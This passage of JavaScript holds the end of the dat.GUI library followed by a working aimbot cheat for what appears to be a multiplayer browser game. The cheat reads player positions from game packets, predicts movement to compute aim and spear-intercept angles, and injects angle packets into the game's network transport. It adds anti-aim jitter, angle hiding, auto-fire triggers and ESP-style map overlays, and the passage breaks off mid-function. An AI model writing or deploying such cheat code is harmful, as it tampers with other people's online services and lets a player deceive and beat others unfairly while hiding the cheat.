                this.domElement.appendChild(this.__closeButton);
            }
            X.bind(this.__closeButton, "click", function() {
                n.closed = !n.closed;
            });
        } else {
            if (o.closed === undefined) {
                o.closed = true;
            }
            var l = document.createTextNode(o.name);
            X.addClass(l, "controller-name");
            s = c(n, l);
            X.addClass(this.__ul, e.CLASS_CLOSED);
            X.addClass(s, "title");
            X.bind(s, "click", function(e) {
                e.preventDefault();
                n.closed = !n.closed;
                if (!n.closed && o.parent) {
                    S.each(o.parent.__folders, function(siblingFolder) {
                        if (siblingFolder !== n) {
                            siblingFolder.closed = true;
                        }
                    });
                }
                return false;
            });
            if (!o.closed) {
                this.closed = false;
            }
        }
        if (o.autoPlace) {
            if (S.isUndefined(o.parent)) {
                if (de) {
                    ce = document.createElement("div");
                    X.addClass(ce, "dg");
                    X.addClass(ce, e.CLASS_AUTO_PLACE_CONTAINER);
                    document.body.appendChild(ce);
                    de = false;
                }
                ce.appendChild(this.domElement);
                X.addClass(this.domElement, e.CLASS_AUTO_PLACE);
            }
            if (!this.parent) {
                w(n, o.width);
            }
        }
        this.__resizeHandler = function() {
            n.onResizeDebounced();
        }
        ;
        X.bind(window, "resize", this.__resizeHandler);
        X.bind(this.__ul, "webkitTransitionEnd", this.__resizeHandler);
        X.bind(this.__ul, "transitionend", this.__resizeHandler);
        X.bind(this.__ul, "oTransitionEnd", this.__resizeHandler);
        this.onResize();
        if (o.resizable) {
            y(this);
        }
        r = function() {
            if (ae && localStorage.getItem(m(n, "isLocal")) === "true") {
                localStorage.setItem(m(n, "gui"), JSON.stringify(n.getSaveObject()));
            }
        }
        ;
        this.saveToLocalStorageIfPossible = r;
        if (!o.parent) {
            (function() {
                var e = n.getRoot();
                e.width += 1;
                S.defer(function() {
                    e.width -= 1;
                });
            }
            )();
        }
    };
    he.toggleHide = function() {
        ue = !ue;
        S.each(_e, function(e) {
            e.domElement.style.display = ue ? "none" : "";
        });
    }
    ;
    he.CLASS_AUTO_PLACE = "a";
    he.CLASS_AUTO_PLACE_CONTAINER = "ac";
    he.CLASS_MAIN = "main";
    he.CLASS_CONTROLLER_ROW = "cr";
    he.CLASS_TOO_TALL = "taller-than-window";
    he.CLASS_CLOSED = "closed";
    he.CLASS_CLOSE_BUTTON = "close-button";
    he.CLASS_CLOSE_TOP = "close-top";
    he.CLASS_CLOSE_BOTTOM = "close-bottom";
    he.CLASS_DRAG = "drag";
    he.DEFAULT_WIDTH = 320;
    he.TEXT_CLOSED = "Close Controls";
    he.TEXT_OPEN = "Open Controls";
    he._keydownHandler = function(e) {
        if (document.activeElement.type !== "text" && (MOD.ModMenuKeyCode === e.which || MOD.ModMenuKeyCode === e.keyCode)) {
            he.toggleHide();
        }
    }
    ;
    X.bind(window, "keydown", he._keydownHandler, false);
    S.extend(he.prototype, {
        add: function(e, t) {
            return f(this, e, t, {
                factoryArgs: Array.prototype.slice.call(arguments, 2)
            });
        },
        addColor: function(e, t) {
            return f(this, e, t, {
                color: true
            });
        },
        remove: function(e) {
            this.__ul.removeChild(e.__li);
            this.__controllers.splice(this.__controllers.indexOf(e), 1);
            var t = this;
            S.defer(function() {
                t.onResize();
            });
        },
        destroy: function() {
            if (this.parent) {
                throw new Error("Only the root GUI should be removed with .destroy(). For subfolders, use gui.removeFolder(folder) instead.");
            }
            if (this.autoPlace) {
                ce.removeChild(this.domElement);
            }
            var e = this;
            S.each(this.__folders, function(t) {
                e.removeFolder(t);
            });
            X.unbind(window, "keydown", he._keydownHandler, false);
            u(this);
        },
        addFolder: function(e) {
            if (this.__folders[e] !== undefined) {
                throw new Error("You already have a folder in this GUI by the name \"" + e + "\"");
            }
            var t = {
                name: e,
                parent: this
            };
            t.autoPlace = this.autoPlace;
            if (this.load && this.load.folders && this.load.folders[e]) {
                t.closed = this.load.folders[e].closed;
                t.load = this.load.folders[e];
            }
            var n = new he(t);
            this.__folders[e] = n;
            var o = c(this, n.domElement);
            X.addClass(o, "folder");
            return n;
        },
        removeFolder: function(e) {
            this.__ul.removeChild(e.domElement.parentElement);
            delete this.__folders[e.name];
            if (this.load && this.load.folders && this.load.folders[e.name]) {
                delete this.load.folders[e.name];
            }
            u(e);
            var t = this;
            S.each(e.__folders, function(t) {
                e.removeFolder(t);
            });
            S.defer(function() {
                t.onResize();
            });
        },
        open: function() {
            this.closed = false;
        },
        close: function() {
            this.closed = true;
        },
        hide: function() {
            this.domElement.style.display = "none";
        },
        show: function() {
            this.domElement.style.display = "";
        },
        onResize: function() {
            var e = this.getRoot();
            if (e.scrollable) {
                var t = X.getOffset(e.__ul).top;
                var n = 0;
                S.each(e.__ul.childNodes, function(t) {
                    if (!e.autoPlace || t !== e.__save_row) {
                        n += X.getHeight(t);
                    }
                });
                if (window.innerHeight - t - 20 < n) {
                    X.addClass(e.domElement, he.CLASS_TOO_TALL);
                    e.__ul.style.height = window.innerHeight - t - 20 + "px";
                } else {
                    X.removeClass(e.domElement, he.CLASS_TOO_TALL);
                    e.__ul.style.height = "auto";
                }
            }
            if (e.__resize_handle) {
                S.defer(function() {
                    e.__resize_handle.style.height = e.__ul.offsetHeight + "px";
                });
            }
            if (e.__closeButton) {
                e.__closeButton.style.width = e.width + "px";
            }
        },
        onResizeDebounced: S.debounce(function() {
            this.onResize();
        }, 50),
        remember: function() {
            if (S.isUndefined(le)) {
                (le = new ie()).domElement.innerHTML = "<div id=\"dg-save\" class=\"dg dialogue\">\n\n  Here's the new load parameter for your <code>GUI</code>'s constructor:\n\n  <textarea id=\"dg-new-constructor\"></textarea>\n\n  <div id=\"dg-save-locally\">\n\n    <input id=\"dg-local-storage\" type=\"checkbox\"/> Automatically save\n    values to <code>localStorage</code> on exit.\n\n    <div id=\"dg-local-explain\">The values saved to <code>localStorage</code> will\n      override those passed to <code>dat.GUI</code>'s constructor. This makes it\n      easier to work incrementally, but <code>localStorage</code> is fragile,\n      and your friends may not see the same values you do.\n\n    </div>\n\n  </div>\n\n</div>";
            }
            if (this.parent) {
                throw new Error("You can only call remember on a top level GUI.");
            }
            var e = this;
            S.each(Array.prototype.slice.call(arguments), function(t) {
                if (e.__rememberedObjects.length === 0) {
                    v(e);
                }
                if (e.__rememberedObjects.indexOf(t) === -1) {
                    e.__rememberedObjects.push(t);
                }
            });
            if (this.autoPlace) {
                w(this, this.width);
            }
        },
        getRoot: function() {
            for (var e = this; e.parent; ) {
                e = e.parent;
            }
            return e;
        },
        getSaveObject: function() {
            var e = this.load;
            e.closed = this.closed;
            if (this.__rememberedObjects.length > 0) {
                e.preset = this.preset;
                e.remembered ||= {};
                e.remembered[this.preset] = x(this);
            }
            e.folders = {};
            S.each(this.__folders, function(t, n) {
                e.folders[n] = t.getSaveObject();
            });
            return e;
        },
        save: function() {
            this.load.remembered ||= {};
            this.load.remembered[this.preset] = x(this);
            _(this, false);
            this.saveToLocalStorageIfPossible();
        },
        saveAs: function(e) {
            if (!this.load.remembered) {
                this.load.remembered = {};
                this.load.remembered[se] = x(this, true);
            }
            this.load.remembered[e] = x(this);
            this.preset = e;
            g(this, e, true);
            this.saveToLocalStorageIfPossible();
        },
        revert: function(e) {
            S.each(this.__controllers, function(t) {
                if (this.getRoot().load.remembered) {
                    p(e || this.getRoot(), t);
                } else {
                    t.setValue(t.initialValue);
                }
                if (t.__onFinishChange) {
                    t.__onFinishChange.call(t, t.getValue());
                }
            }, this);
            S.each(this.__folders, function(e) {
                e.revert(e);
            });
            if (!e) {
                _(this.getRoot(), false);
            }
        },
        listen: function(e) {
            var t = this.__listening.length === 0;
            this.__listening.push(e);
            if (t) {
                C(this.__listening);
            }
        },
        updateDisplay: function() {
            S.each(this.__controllers, function(e) {
                e.updateDisplay();
            });
            S.each(this.__folders, function(e) {
                e.updateDisplay();
            });
        }
    });
    var pe = {
        Color: I,
        math: N,
        interpret: R
    };
    var fe = {
        Controller: z,
        BooleanController: K,
        OptionController: Y,
        StringController: J,
        NumberController: W,
        NumberControllerBox: Q,
        NumberControllerSlider: q,
        FunctionController: Z,
        ColorController: $
    };
    var me = {
        dom: X
    };
    var ge = {
        GUI: he
    };
    var be = he;
    var ve = {
        color: pe,
        controllers: fe,
        dom: me,
        gui: ge,
        GUI: be
    };
    e.color = pe;
    e.controllers = fe;
    e.dom = me;
    e.gui = ge;
    e.GUI = be;
    e.default = ve;
    Object.defineProperty(e, "__esModule", {
        value: true
    });
});
/* =================== dat.GUI end =================== */
/* ===================== AIMBOT (ported from message client) ===================== */
var AIM_RAD = 180 / Math.PI;
var SPEAR_IDX = __SPEAR_IDX__;
try { window.__SPEAR_IDX = SPEAR_IDX; } catch (e) {}
function calculateDistance(point1, point2) {
    return Math.floor(Math.sqrt(Math.pow(point1.x - point2.x, 2) + Math.pow(point1.y - point2.y, 2)));
}
class LinesCon {
    constructor(alpha, width, color) {
        this.x1 = -10;
        this.x2 = -10;
        this.y1 = -10;
        this.y2 = -10;
        this.alpha = alpha;
        this.width = width;
        this.color = color;
    }
    reset(x1, y1, x2, y2) {
        this.x1 = x1 === undefined ? -10 : x1;
        this.y1 = y1 === undefined ? -10 : y1;
        this.x2 = x2 === undefined ? -10 : x2;
        this.y2 = y2 === undefined ? -10 : y2;
    }
}
class GetTarget {
    constructor(ids) {
        this.id = ids;
        this.x = -1;
        this.y = -1;
        this.prevX = [];
        this.prevY = [];
        this.active = false;
        this.weapon = -1;
        this.weaponIdx = -1;
        this.gear = -1;
        this.updT = 0;
        this.updDt = 62;
        for (let lastpos = 0; lastpos < 3; lastpos++) {
            this.prevX.push(-1);
            this.prevY.push(-1);
        }
    }
    update(ux, uy, xy) {
        if (this.x !== ux || this.y !== uy) {
            this.active = true;
            var updNow = Date.now();
            if (this.x !== -1 && this.updT !== 0)
                this.updDt = Math.min(Math.max(updNow - this.updT, 16), 2000);
            this.updT = updNow;
            this.prevX[2] = this.prevX[1];
            this.prevX[1] = this.prevX[0];
            this.prevX[0] = this.x;
            this.x = ux;
            this.prevY[2] = this.prevY[1];
            this.prevY[1] = this.prevY[0];
            this.prevY[0] = this.y;
            this.y = uy;
            if (xy !== undefined)
                this.weapon = xy;
            AimbotRefresh();
        }
    }
    staleT() {
        return this.updT ? Math.min((Date.now() - this.updT) / 62, 30) : 0;
    }
    setInactive() {
        this.x = -1;
        this.y = -1;
        for (let lastposs = 0; lastposs < 3; lastposs++) {
            this.prevX[lastposs] = -1;
            this.prevY[lastposs] = -1;
        }
        this.active = false;
        this.weapon = -1;
        this.updT = 0;
        this.updDt = 62;
        AimbotRefresh();
    }
}
class GetAllTargetsCon {
    constructor() {
        this.players = [];
        this.ghouls = [];
        for (let player = 1; player < 121; player++) {
            this.players[player] = new GetTarget(player);
        }
        for (let ghoul = 1; ghoul < 999; ghoul++) {
            this.ghouls[ghoul] = new GetTarget(ghoul);
        }
        this.lines = [];
        this.lines.push(new LinesCon(0.6, 1, "#FFF200"));
        this.lines.push(new LinesCon(0.8, 3, "#FF0000"));
        this.lines.push(new LinesCon(0.8, 3, "#00FF00"));
        this.lines.push(new LinesCon(0.8, 2, "#0000FF"));
        this.mousePosition = { x: 0, y: 0 };
        this.mouseMapCords = { x: 0, y: 0 };
        this.selfPosition = { x: 0, y: 0 };
        this.cameraCenter = { x: 0, y: 0 };
        this.selfFromPacket = 0;
        this.lastId = 0;
        this.myLastMoveDirection = 0;
        this.selfWeapon = -1;
    }
    getPlayerById(pID) {
        if (!this.players[pID])
            this.players[pID] = new GetTarget(pID);
        return this.players[pID];
    }
    getGhoulByUid(uID) {
        if (!this.ghouls[uID])
            this.ghouls[uID] = new GetTarget(uID);
        return this.ghouls[uID];
    }
    resetLines() {
        this.lines.forEach(line => line.reset());
    }
    resetAll() {
        for (let i = 1; i < this.players.length; i++) {
            if (this.players[i] && this.players[i].active)
                this.players[i].setInactive();
        }
        for (let j = 1; j < this.ghouls.length; j++) {
            if (this.ghouls[j] && this.ghouls[j].active)
                this.ghouls[j].setInactive();
        }
        this.resetLines();
        this.lastId = 0;
    }
}
class AimbotCon {
    constructor() {
        this.lastAngle = 0;
        this.currentTarget = null;
        this.dead = false;
        this.mouseDown = false;
        this.refreshing = false;
        this._refreshTimer = null;
        this.selfId = -1;
    }
    send(packet) {
        try {
            if (packet[0] === 6 && typeof packet[1] === "number")
                PingAim.onSend(packet[1]);
        } catch (e) {}
        try {
            const transport = globalThis.__autoPortAimbotPacketTransport;
            if (typeof transport === "function")
                transport(packet);
        } catch (e) {}
    }
    myId() {
        try {
            var id = World.PLAYER[__TOK_MYID__];
            if (id !== undefined && id !== null && id !== 0)
                this.selfId = id;
        } catch (e) {}
        return this.selfId;
    }
    onDeath() {
        this.dead = true;
        this.currentTarget = null;
        this.lastAngle = 0;
        this.mouseDown = false;
        GetAllTargets.resetAll();
    }
    scheduleRefresh() {
        if (this.isDead())
            return;
        var self = this;
        this.refreshing = true;
        clearTimeout(this._refreshTimer);
        this._refreshTimer = setTimeout(function() {
            self.refreshing = false;
        }, 140);
    }
    refresh() {
        aimbotTick();
    }
    packetAngle(fallbackAngle) {
        if (__gk(MOD.AimBotEnabled))
            return ((Math.floor(this.lastAngle) % 360) + 360) % 360;
        if (MOD.hidePlayerAngle)
            return (((Math.floor(fallbackAngle) + 180) % 360) + 360) % 360;
        return fallbackAngle;
    }
    isDead() {
        if (this.dead || !World.PLAYER || this.myId() === 0)
            return true;
        return GetAllTargets.getPlayerById(this.myId()).active === false;
    }
    getSelf() {
        // the body position decoded from our own entity packet is the only
        // true aim origin — the canvas center drifts off-body when the camera
        // is not centered on the player (mobile scaling, map edges)
        if (GetAllTargets.selfFromPacket && Date.now() - GetAllTargets.selfFromPacket < 2000)
            return GetAllTargets.selfPosition;
        var sid = this.myId();
        if (sid > 0 && GetAllTargets.players[sid] && GetAllTargets.players[sid].active)
            return GetAllTargets.players[sid];
        if (GetAllTargets.cameraCenter && (GetAllTargets.cameraCenter.x !== 0 || GetAllTargets.cameraCenter.y !== 0))
            return GetAllTargets.cameraCenter;
        return GetAllTargets.selfPosition;
    }
    isSelf(t) {
        var sid = this.myId();
        if (sid > 0 && t.id === sid)
            return true;
        return calculateDistance(this.getSelf(), t) < 12;
    }
    findTarget(from, maxDistance) {
        var best = null;
        var bestDist = maxDistance;
        var mode = MOD.target || "players";
        var myTeam = -2;
        try { myTeam = World.PLAYER.__TOK_CLAN__; } catch (e) {}
        if (mode === "players" || mode === "all") {
            for (let pid = 1; pid < GetAllTargets.players.length; pid++) {
                const player = GetAllTargets.players[pid];
                if (!player || !player.active || player.id === this.myId() || this.isSelf(player))
                    continue;
                if (!MOD.TargetTeammate && myTeam !== -1 && myTeam !== -2 &&
                    World.players[player.id] !== undefined &&
                    World.players[player.id].__TOK_CLAN__ === myTeam)
                    continue;
                let distance = calculateDistance(from, player);
                if (distance < bestDist) {
                    best = player;
                    bestDist = distance;
                }
            }
        }
        if (mode === "ghouls" || mode === "all") {
            for (let uid = 1; uid < GetAllTargets.ghouls.length; uid++) {
                const ghoul = GetAllTargets.ghouls[uid];
                if (!ghoul || !ghoul.active)
                    continue;
                let distance = calculateDistance(from, ghoul);
                if (distance < bestDist) {
                    best = ghoul;
                    bestDist = distance;
                }
            }
        }
        return best;
    }
    predict(me, target, extraMs, withOffset) {
        if (target.prevX[0] === -1 || !target.updT)
            return { x: target.x, y: target.y };
        var dt = Math.max(target.updDt || 62, 16);
        if (Date.now() - target.updT > Math.max(300, dt * 2.5))
            return { x: target.x, y: target.y };
        var dx = target.x - target.prevX[0];
        var dy = target.y - target.prevY[0];
        var step = Math.sqrt(dx * dx + dy * dy);
        if (step > 300)
            return { x: target.x, y: target.y };
        var vx = dx / dt, vy = dy / dt;
        var sp = step / dt;
        if (sp > 0.45) {
            vx *= 0.45 / sp;
            vy *= 0.45 / sp;
        }
        var t = (calculateDistance(me, target) / MOD.distanceCoefficient + (withOffset ? MOD.offsetCoefficient : 0)) * 62 + (extraMs || 0);
        var lx = vx * t, ly = vy * t;
        var ll = Math.sqrt(lx * lx + ly * ly);
        if (ll > 450) {
            lx *= 450 / ll;
            ly *= 450 / ll;
        }
        return { x: target.x + lx, y: target.y + ly };
    }
    lockTarget() {
        var t = GetAllTargets.getPlayerById(MOD.lockId);
        return t && t.active && t.x !== -1 ? t : null;
    }
    resolve() {
        var me = this.getSelf();
        var target;
        var px, py;
        if (this.dead) {
            this.currentTarget = null;
            GetAllTargets.lines[0].reset();
            GetAllTargets.lines[1].reset();
            return this.lastAngle;
        }
        if (MOD.resolverType === "ping") {
            if (MOD.lockId > -1) {
                target = this.lockTarget();
            } else if (MOD.mouseFovEnable) {
                target = this.findTarget(GetAllTargets.mouseMapCords, MOD.mouseFov);
            } else {
                target = this.findTarget(me, 2500);
            }
            if (target !== this.currentTarget)
                PingAim.shots = 0;
            this.currentTarget = target;
            PingAim.target = target ? target.id : undefined;
            if (target == null) {
                GetAllTargets.lines[0].reset();
                GetAllTargets.lines[1].reset();
                return this.lastAngle;
            }
            var pp = this.predict(me, target, PingAim.latency(), true);
            px = pp.x;
            py = pp.y;
        } else if (MOD.resolverType === 1 || MOD.resolverType === "1") {
            target = this.findTarget(me, 2500);
            this.currentTarget = target;
            if (target == null) {
                GetAllTargets.lines[0].reset();
                GetAllTargets.lines[1].reset();
                return this.lastAngle;
            }
            var p1 = this.predict(me, target, 0, false);
            px = p1.x;
            py = p1.y;
        } else {
            // "linear" — donor default
            if (MOD.lockId > -1) {
                target = this.lockTarget();
            } else if (MOD.mouseFovEnable) {
                target = this.findTarget(GetAllTargets.mouseMapCords, MOD.mouseFov);
            } else {
                target = this.findTarget(me, 2500);
            }
            this.currentTarget = target;
            if (target == null) {
                GetAllTargets.lines[0].reset();
                GetAllTargets.lines[1].reset();
                return this.lastAngle;
            }
            var pl = this.predict(me, target, 0, true);
            px = pl.x;
            py = pl.y;
        }
        var angle = Math.floor(Math.atan((py - me.y) / (px - me.x)) * 180 / Math.PI);
        if (px < me.x) {
            angle += 180;
        }
        angle = ((angle % 360) + 360) % 360;
        this.lastAngle = angle;
        try {
            window._oDbgAim = {
                sx: me.x | 0, sy: me.y | 0,
                ccx: GetAllTargets.cameraCenter ? GetAllTargets.cameraCenter.x | 0 : -9,
                ccy: GetAllTargets.cameraCenter ? GetAllTargets.cameraCenter.y | 0 : -9,
                sfp: GetAllTargets.selfFromPacket ? Date.now() - GetAllTargets.selfFromPacket : -1,
                tid: target ? target.id : -1,
                tx: target ? target.x | 0 : 0, ty: target ? target.y | 0 : 0,
                tud: target ? Date.now() - target.updT : -1,
                tdt: target ? target.updDt | 0 : -1,
                st: target ? Math.round(target.staleT() * 10) / 10 : -1,
                px: px | 0, py: py | 0, a: angle
            };
        } catch (e) {}
        if (MOD.hideAimbotAngle) {
            try {
                __TOK_NET__.__TOK_SEND__(window.JSON.stringify([6, angle]));
            } catch (_) {}
        }
        if (MOD.visualizeResolving) {
            GetAllTargets.lines[0].color = MOD.visualizeResolvingColor;
            GetAllTargets.lines[0].reset(me.x, me.y, px, py);
            GetAllTargets.lines[1].reset();
        } else {
            GetAllTargets.lines[0].reset();
            GetAllTargets.lines[1].reset();
        }
        return angle;
    }
    spearResolve() {
        var me = this.getSelf();
        var target;
        if (MOD.lockId > -1 && MOD.lockId !== this.myId() && GetAllTargets.players[MOD.lockId] && GetAllTargets.players[MOD.lockId].active) {
            target = GetAllTargets.players[MOD.lockId];
        } else if (MOD.mouseFovEnable) {
            target = this.findTarget(GetAllTargets.mouseMapCords, MOD.mouseFov);
        } else {
            target = this.findTarget(me, Math.min(2500, MOD.spearMaxRange || 560));
        }
        this.currentTarget = target;
        if (target == null) {
            GetAllTargets.lines[0].reset();
            GetAllTargets.lines[1].reset();
            return this.lastAngle;
        }
        var spd = MOD.spearSpeed || 46.5;
        var fwd = MOD.spearHandFwd || 22;
        var side = MOD.spearHandSide || -39;
        var px = target.x, py = target.y;
        var t = 0;
        // the spear launches from the hand ~{fwd,side}px off the player
        // center, rotated by the aim angle — iterate: solve the intercept
        // from the spawn point, then recompute spawn for the new angle.
        var updS = 62 / (target.updDt || 62);
        var tvx = 0, tvy = 0;
        if (target.prevX[0] !== -1) {
            if (target.prevX[2] !== -1) {
                // 3-sample average = (newest - oldest)/3 — least jitter
                tvx = (target.x - target.prevX[2]) / 3;
                tvy = (target.y - target.prevY[2]) / 3;
            } else if (target.prevX[1] !== -1) {
                tvx = (target.x - target.prevX[1]) * 0.5;
                tvy = (target.y - target.prevY[1]) * 0.5;
            } else {
                tvx = target.x - target.prevX[0];
                tvy = target.y - target.prevY[0];
            }
            tvx *= updS;
            tvy *= updS;
        }
        var st = (typeof target.staleT === "function") ? target.staleT() : 0;
        var rad = Math.atan2(target.y - me.y, target.x - me.x);
        for (var it = 0; it < 3; it++) {
            var cs = Math.cos(rad), sn = Math.sin(rad);
            var sx = me.x + cs * fwd - sn * side;
            var sy = me.y + sn * fwd + cs * side;
            var dx = target.x + tvx * st - sx;
            var dy = target.y + tvy * st - sy;
            // spear flies straight at a constant ~0.75px/ms (def field);
            // solve |d + v*t| = s*t for the smallest positive t.
            var qa = tvx * tvx + tvy * tvy - spd * spd;
            var qb = 2 * (dx * tvx + dy * tvy);
            var qc = dx * dx + dy * dy;
            var tN = -1;
            if (Math.abs(qa) < 0.000001) {
                if (Math.abs(qb) > 0.000001) tN = -qc / qb;
            } else {
                var disc = qb * qb - 4 * qa * qc;
                if (disc >= 0) {
                    var sd = Math.sqrt(disc);
                    var t1 = (-qb - sd) / (2 * qa), t2 = (-qb + sd) / (2 * qa);
                    if (t1 > 0 && t2 > 0) tN = Math.min(t1, t2);
                    else tN = Math.max(t1, t2);
                }
            }
            if (!(tN > 0)) tN = Math.sqrt(qc) / spd;
            t = tN;
            px = target.x + tvx * (st + t);
            py = target.y + tvy * (st + t);
            rad = Math.atan2(py - sy, px - sx);
        }
        // spear dies after ~600px (def path) — don't aim beyond its range
        if (t * spd > 590) {
            this.currentTarget = null;
            GetAllTargets.lines[0].reset();
            GetAllTargets.lines[1].reset();
            return this.lastAngle;
        }
        var angle = Math.floor(rad * AIM_RAD);
        angle = ((angle % 360) + 360) % 360;
        // throw only when consecutive resolves agree — a juking target swings
        // the predicted intercept angle; gating on stability = no wasted spears
        var dA = Math.abs(angle - (this._sPrevAng === undefined ? angle : this._sPrevAng));
        if (dA > 180) dA = 360 - dA;
        this._spearStable = (this._sPrevTid === target.id && dA <= (MOD.spearStabDeg || 2.5));
        this._sPrevAng = angle;
        this._sPrevTid = target.id;
        this.lastAngle = angle;
        try {
            window._oDbgSpear = { w: GetAllTargets.selfWeapon, idx: SPEAR_IDX,
                tid: target.id, tx: target.x | 0, ty: target.y | 0,
                px: px | 0, py: py | 0, a: angle };
        } catch (e) {}
        if (MOD.visualizeResolving) {
            GetAllTargets.lines[0].color = "#00FFFF";
            GetAllTargets.lines[0].reset(me.x, me.y, target.x, target.y);
            GetAllTargets.lines[1].color = "#FF3030";
            GetAllTargets.lines[1].reset(me.x, me.y, px, py);
        }
        return angle;
    }
    hasTarget() {
        return this.currentTarget != null;
    }
    wannaFire(watarget = this.currentTarget) {
        if (watarget === null)
            return false;
        if ((watarget.x - watarget.prevX[0] > 0) != (watarget.prevX[0] - watarget.prevX[1] > 0) || (watarget.y - watarget.prevY[0] > 0) != (watarget.prevY[0] - watarget.prevY[1] > 0)) {
            return true;
        }
        return false;
    }
}
class JitterCon {
    constructor() {
        this.roflAngle = 0;
        this.roflStep = 1;
        this.jitterStep = false;
        this.strafeStep = 0;
        this.strafeMoves = [1, 2, 4, 8, 1, 2, 4, 8, 5, 9, 10, 6];
    }
    getJitterAngle() {
        if (Aimbot.mouseDown)
            return Aimbot.resolve();
        this.jitterStep = !this.jitterStep;
        var base = Aimbot.resolve();
        return this.jitterStep ? base + MOD.jitterOffset : base - MOD.jitterOffset;
    }
    getAntiAimAngle() {
        if (MOD.antiAimMode === "At target")
            return (Aimbot.resolve() + 180) % 360;
        if (!Aimbot.mouseDown)
            Aimbot.resolve();
        if (MOD.antiAimMode === "Round") {
            this.roflStep++;
            this.roflAngle += 4 + Math.floor(Math.abs((this.roflStep % 600) - 300) / 12);
            return this.roflAngle % 360;
        }
        if (MOD.antiAimMode === "Round2") {
            this.roflStep++;
            return Math.floor((this.roflStep % 20) * 18);
        }
        return Number(MOD.antiAimMode) || 0;
    }
    strafe() {
        this.strafeStep += MOD.antiAimCoefficient;
        var idx = Math.floor(this.strafeStep / MOD.antiAimCoefficient);
        return this.strafeMoves[idx % this.strafeMoves.length];
    }
}
var PingAim = {
    avgPing: 0,
    startfrom: 1,
    ping: 90,
    delay: 1,
    delaySend: 20,
    aimsteps: 2,
    pingSteps: 125,
    target: undefined,
    currentPing: 0,
    ammo: 30,
    samples: 0,
    shots: 0,
    tick: 0,
    lastSent: -1,
    lastEcho: undefined,
    probe: null,
    hist: [],
    deltaPing: 0,
    tickDelay: 0,
    lastSelfT: 0,
    triggerTol: 8,
    trig: false,
    aimA: -1,
    aimSince: 0,
    confirmed: function (a) {
        var now = Date.now();
        if (this.aimA === -1 || Math.abs(((a - this.aimA) % 360 + 540) % 360 - 180) > this.triggerTol) {
            this.aimA = a;
            this.aimSince = now;
        }
        var ok = this.lastEcho !== undefined && Math.abs(((this.lastEcho * 360 / 255 - a) % 360 + 540) % 360 - 180) <= this.triggerTol;
        this.trig = ok || now - this.aimSince > Math.max(400, this.latency() * 2);
        return this.trig;
    },
    hudText: function () {
        return "avgPing: " + Math.round(this.avgPing) + "\ndeltaPing: " + Math.round(this.deltaPing) + "\ndelay: " + this.tickDelay + "\nlead: " + Math.round(this.latency()) + (MOD.pingTrigger ? "\ntrigger: " + (this.trig ? "FIRE" : "wait") : "");
    },
    onSend: function (a) {
        var now = Date.now();
        if (this.probe && now - this.probe.t > 2000)
            this.probe = null;
        if (!this.probe && this.lastSent !== -1) {
            var d = Math.abs(((a - this.lastSent) % 360 + 540) % 360 - 180);
            if (d >= 30)
                this.probe = { t: now, a: a };
        }
        this.lastSent = a;
    },
    onSelf: function (v) {
        if (typeof v !== "number")
            return;
        if (this.probe && Math.abs(((v * 360 / 255 - this.probe.a) % 360 + 540) % 360 - 180) <= 6) {
            var rtt = Date.now() - this.probe.t;
            this.probe = null;
            if (rtt >= 5 && rtt <= 1500) {
                this.currentPing = rtt;
                this.samples++;
                this.hist.push(rtt);
                if (this.hist.length > 15)
                    this.hist.shift();
                var srt = this.hist.slice().sort(function (x, y) { return x - y; });
                var k = Math.max(1, Math.ceil(srt.length / 2)), sum = 0;
                for (var i = 0; i < k; i++)
                    sum += srt[i];
                this.avgPing = sum / k;
                this.deltaPing = rtt - this.avgPing;
            }
        }
        var now = Date.now();
        if (this.lastSelfT)
            this.tickDelay = Math.round(this.tickDelay + (Math.min(now - this.lastSelfT, 500) - this.tickDelay) * 0.2);
        this.lastSelfT = now;
        this.lastEcho = v;
    },
    latency: function () {
        return Math.min(600, this.samples > 0 ? this.avgPing : this.ping) * this.startfrom;
    }
};
var MOD = {
    AimBotEnabled: false,
    AimbotSpearEnabled: false,
    spearSpeed: 46.5,
    spearMaxRange: 560,
    spearHandFwd: 22,
    spearHandSide: -39,
    spearStabDeg: 2.5,
    hideAimbotAngle: false,
    hidePlayerAngle: false,
    target: "players",
    TargetTeammate: false,
    resolverType: "ping",
    pingAimV: 1,
    pingHud: true,
    pingTrigger: true,
    mouseFovEnable: true,
    mouseFov: 131313,
    distanceCoefficient: 100,
    bulletSpeedCoefficient: 4,
    offsetCoefficient: 0.1,
    dynamicAimEnabled: false,
    closeRange: 200,
    closeDistCoeff: 1000,
    closeOffsetCoeff: 0.1,
    midRange: 600,
    midDistCoeff: 360,
    midOffsetCoeff: 0.5,
    farDistCoeff: 300,
    farOffsetCoeff: 0.8,
    visualizeResolving: true,
    visualizeResolvingColor: "#FFF200",
    autoFire: false,
    lockId: -1,
    AntiAimbot: false,
    antiAimMode: "At target",
    antiAimCoefficient: 100,
    jitterActive: false,
    jitterOffset: 85,
    stopJittersOnStop: false,
    ShowRealAngles: "withAim",
    ShowPosition: true,
    ShowNamesOnMap: true,
    ShowGauges: true,
    ShowMines: true,
    ShowSpikes: true,
    ShowWires: true,
    ShowHousesNamesOnMap: true,
    ShowKarmaOnPlayers: false,
    ShowBuildingOwner: true,
    AutoOpenSlotsInv: true,
    TeamClanColor: "#FF0000",
    EnemyClanColor: "#83F6A4",
    Token: "",
    AimbotKey: "KeyZ",
    AntiAimbotKey: "NoKey",
    JitterKey: "KeyJ",
    HideAngleKey: "KeyH",
    ModMenuKey: "KeyM",
    ModMenuKeyCode: 77
};
function AimbotRefresh() {
    GetAllTargets.resetLines();
    var meId = 0;
    try { meId = Aimbot.myId(); } catch (e) {}
    var meTarget = meId > 0 ? GetAllTargets.players[meId] : null;
    if (meId <= 0 || !meTarget || meTarget.x === -1 || meTarget.y === -1) {
        if (GetAllTargets.lastId !== 0) {
            GetAllTargets.lastId = 0;
            for (let allplayers = 1; allplayers < 121; allplayers++) {
                GetAllTargets.getPlayerById(allplayers).setInactive();
            }
            for (let allghouls = 1; allghouls < 999; allghouls++) {
                GetAllTargets.getGhoulByUid(allghouls).setInactive();
            }
        }
        return;
    }
    GetAllTargets.lastId = meId;
    if (__gk(MOD.AimBotEnabled)) {
        Aimbot.send([6, __gk(Aimbot.resolve())]);
    }
}
var GetAllTargets = new GetAllTargetsCon();
var Aimbot = new AimbotCon();
var Jitter = new JitterCon();
function aimbotTick() {
    if (Aimbot.dead)
        return;
    var _spearOn = __gk(MOD.AimbotSpearEnabled) && GetAllTargets.selfWeapon === SPEAR_IDX && SPEAR_IDX >= 0;
    if (_spearOn) {
        var sAngle = Aimbot.spearResolve();
        Aimbot.send([6, __gk(sAngle)]);
